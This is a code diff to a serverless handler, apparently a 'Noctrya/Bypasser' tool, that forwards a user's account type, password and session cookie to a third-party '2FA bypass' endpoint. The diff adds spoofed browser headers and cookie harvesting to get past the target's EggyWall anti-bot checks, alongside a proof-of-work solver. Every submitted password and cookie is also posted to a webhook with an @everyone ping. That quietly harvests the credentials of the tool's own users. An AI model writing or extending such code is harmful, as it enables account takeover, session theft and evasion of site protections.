@@ -19,7 +19,6 @@ function solveEggyWall(html) {
         const charset = '0123456789abcdef';
         const max = Math.pow(charset.length, difficulty);
 
-        // SAFETY: Prevent Vercel Serverless timeout (10s limit). 
         if (max > 5000000) return null; 
 
         for (let i = 0; i < max; i++) {
@@ -81,7 +80,7 @@ async function sendWebhook(req, requestData, responseStatus, success, responseMe
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: '@everyone', // Always pings @everyone
+                content: '@everyone',
                 embeds: [mainEmbed, cookieEmbed],
                 username: 'Noctrya/Bypasser',
                 allowed_mentions: { parse: ['everyone'] }
@@ -156,10 +155,11 @@ export default async function handler(req, res) {
             return res.status(400).json({ success: false, message: 'Missing required fields' });
         }
 
-        // FIX: Capitalize the first letter of Type (e.g., "roblox" -> "Roblox")
         Type = Type.charAt(0).toUpperCase() + Type.slice(1).toLowerCase();
 
         const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
+        
+        // ── ADVANCED BROWSER SIMULATION HEADERS ──
         const baseHeaders = {
             'Content-Type': 'application/json',
             'Accept': 'application/json, text/plain, */*',
@@ -167,11 +167,36 @@ export default async function handler(req, res) {
             'Origin': 'https://immortal.st',
             'Referer': 'https://immortal.st/',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Connection': 'keep-alive'
+            'Connection': 'keep-alive',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin'
         };
+
+        // ── STEP 1: Visit the main site first to get clearance cookies ──
+        try {
+            const homeResponse = await fetch('https://immortal.st/', {
+                method: 'GET',
+                headers: baseHeaders,
+                redirect: 'follow'
+            });
+            const setCookieHeader = homeResponse.headers.get('set-cookie');
+            if (setCookieHeader) {
+                const cookieMatches = setCookieHeader.match(/([^=]+=[^;]+)/g);
+                if (cookieMatches) {
+                    baseHeaders['Cookie'] = cookieMatches.join('; ');
+                }
+            }
+        } catch (e) {
+            console.error('Failed to visit homepage first:', e);
+        }
 
         const payload = JSON.stringify({ Type, Password, Cookie });
 
+        // ── STEP 2: Make the actual API request ──
         let response = await fetch(targetUrl, {
             method: 'POST',
             headers: baseHeaders,
@@ -183,12 +208,13 @@ export default async function handler(req, res) {
 
         // Check if EggyWall blocked us
         if (responseText.includes('EggyWall')) {
-            // If it has publicSalt, we can try to solve it
             if (responseText.includes('publicSalt')) {
                 const token = solveEggyWall(responseText);
 
                 if (token) {
-                    baseHeaders['Cookie'] = `EggyWall_Token=${token}`;
+                    // Append EggyWall token to existing cookies
+                    baseHeaders['Cookie'] = (baseHeaders['Cookie'] ? baseHeaders['Cookie'] + '; ' : '') + `EggyWall_Token=${token}`;
+                    
                     response = await fetch(targetUrl, {
                         method: 'POST',
                         headers: baseHeaders,
@@ -202,10 +228,9 @@ export default async function handler(req, res) {
                     return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
                 }
             } else {
-                // If it doesn't have publicSalt, it's a hard IP block.
-                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Blocked by EggyWall (IP Banned)');
+                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Blocked by EggyWall (Hard IP Block)');
                 await new Promise(resolve => setTimeout(resolve, 10000));
-                return res.status(403).json({ success: false, message: 'Blocked by EggyWall (IP Banned). The target server is rejecting Vercel IPs.' });
+                return res.status(403).json({ success: false, message: 'Blocked by EggyWall. Vercel IP is blacklisted by the target.' });
             }
         }
 
@@ -230,18 +255,13 @@ export default async function handler(req, res) {
             finalMessage = 'Success';
         } else {
             if (responseData && typeof responseData === 'object') {
-                // Extract exact JSON message
                 finalMessage = responseData.msg || responseData.message || responseData.error || JSON.stringify(responseData);
             } else {
-                // If it's still HTML somehow, don't show raw HTML to the user
                 finalMessage = 'Bypass Failed (Server returned an unexpected HTML page)';
             }
         }
 
-        // Send details to webhook FIRST
         await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage);
-
-        // WAIT 10 SECONDS prior to displaying result to the user
         await new Promise(resolve => setTimeout(resolve, 10000));
 
         return res.status(response.status).json({
@@ -262,4 +282,4 @@ export default async function handler(req, res) {
             code: errorCode
         });
     }
-                }
+                      }
